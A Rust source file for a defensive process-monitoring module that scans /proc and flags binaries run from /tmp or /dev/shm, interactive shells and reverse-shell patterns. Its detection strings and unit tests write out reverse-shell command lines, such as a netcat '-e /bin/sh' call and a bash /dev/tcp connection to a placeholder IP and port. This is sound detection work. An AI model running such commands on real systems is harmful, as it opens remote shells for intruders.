//! Process-snapshot heuristics: suspicious execution (reverse shells, /tmp
//! binaries) and unexpected executables (baseline learning). Heuristic —
//! documented limitations: no kernel-level guarantees, no auditd integration.

use std::path::Path;

/// One running process.
#[derive(Debug, Clone, PartialEq)]
pub struct ProcEntry {
    pub pid: u32,
    pub exe: String,
    pub cmdline: String,
    pub uid: u32,
}

/// Scan /proc for running processes (fail-open on any unreadable entry).
pub fn scan_procs(root: &Path) -> Vec<ProcEntry> {
    let mut out = Vec::new();
    let Ok(entries) = std::fs::read_dir(root) else {
        return out;
    };
    for e in entries.flatten() {
        let name = e.file_name();
        let Ok(pid) = name.to_string_lossy().parse::<u32>() else {
            continue;
        };
        let exe = std::fs::read_link(e.path().join("exe"))
            .map(|p| p.to_string_lossy().into_owned())
            .unwrap_or_default();
        let cmdline = std::fs::read(e.path().join("cmdline"))
            .map(|b| {
                b.split(|c| *c == 0)
                    .filter(|s| !s.is_empty())
                    .map(|s| String::from_utf8_lossy(s).into_owned())
                    .collect::<Vec<_>>()
                    .join(" ")
            })
            .unwrap_or_default();
        let uid = std::fs::read_to_string(e.path().join("status"))
            .ok()
            .and_then(|s| {
                s.lines()
                    .find_map(|l| l.strip_prefix("Uid:"))
                    .and_then(|l| l.split_whitespace().next())
                    .and_then(|u| u.parse::<u32>().ok())
            })
            .unwrap_or(0);
        out.push(ProcEntry {
            pid,
            exe,
            cmdline,
            uid,
        });
    }
    out
}

/// Suspicious-execution heuristics. Returns the reason, or None.
pub fn suspicious(entry: &ProcEntry) -> Option<String> {
    if entry.exe.starts_with("/tmp/") || entry.exe.starts_with("/dev/shm/") {
        return Some(format!("executable from {}", entry.exe));
    }
    let c = entry.cmdline.as_str();
    if c.contains("/bin/sh -i") || c.contains("bash -i") {
        return Some("interactive shell".into());
    }
    if c.contains("/dev/tcp/") {
        return Some("reverse-shell pattern (/dev/tcp)".into());
    }
    if c.contains("nc -e") || c.contains("ncat -e") {
        return Some("netcat shell pattern".into());
    }
    None
}

/// System binary prefixes (anything else outside the baseline is unexpected).
const SYSTEM_PREFIXES: &[&str] = &[
    "/usr/bin",
    "/usr/sbin",
    "/bin",
    "/sbin",
    "/usr/lib",
    "/lib",
    "/opt/",
    "/usr/local/bin",
    "/usr/local/sbin",
];

/// True when an executable path looks like a standard system binary.
pub fn is_system_path(exe: &str) -> bool {
    SYSTEM_PREFIXES.iter().any(|p| exe.starts_with(p))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn entry(exe: &str, cmdline: &str) -> ProcEntry {
        ProcEntry {
            pid: 1,
            exe: exe.into(),
            cmdline: cmdline.into(),
            uid: 0,
        }
    }

    #[test]
    fn flags_tmp_execution() {
        assert_eq!(
            suspicious(&entry("/tmp/x", "x")),
            Some("executable from /tmp/x".into())
        );
        assert_eq!(
            suspicious(&entry("/dev/shm/p", "p")),
            Some("executable from /dev/shm/p".into())
        );
    }

    #[test]
    fn flags_reverse_shell_patterns() {
        assert!(suspicious(&entry("/bin/bash", "bash -c /dev/tcp/1.2.3.4/4444")).is_some());
        assert!(suspicious(&entry("/bin/nc", "nc -e /bin/sh 1.2.3.4 4444")).is_some());
        assert!(suspicious(&entry("/bin/sh", "/bin/sh -i")).is_some());
    }

    #[test]
    fn ignores_normal_processes() {
        assert_eq!(
            suspicious(&entry("/usr/bin/nginx", "nginx: worker process")),
            None
        );
        assert_eq!(
            suspicious(&entry("/usr/bin/python3", "python3 app.py")),
            None
        );
    }

    #[test]
    fn system_path_detection() {
        assert!(is_system_path("/usr/bin/nginx"));
        assert!(is_system_path("/opt/example/bin/tool"));
        assert!(!is_system_path("/home/alice/bin/evil"));
        assert!(!is_system_path("/tmp/evil"));
    }

    #[test]
    fn scans_fake_proc_tree() {
        let root = std::env::temp_dir().join(format!("wt-proc-{}", std::process::id()));
        std::fs::create_dir_all(root.join("1")).unwrap();
        std::os::unix::fs::symlink("/tmp/evil", root.join("1/exe")).unwrap();
        std::fs::write(
            root.join("1/cmdline"),
            b"/tmp/evil\x00-e\x00/usr/bin/nc\x001.2.3.4\x004444",
        )
        .unwrap();
        std::fs::write(root.join("1/status"), "Uid:\t0\t0\t0\t0\n").unwrap();
        let procs = scan_procs(&root);
        assert_eq!(procs.len(), 1);
        assert_eq!(procs[0].exe, "/tmp/evil");
        assert!(procs[0].cmdline.contains("1.2.3.4"));
        assert_eq!(procs[0].uid, 0);
        std::fs::remove_dir_all(&root).ok();
    }
}
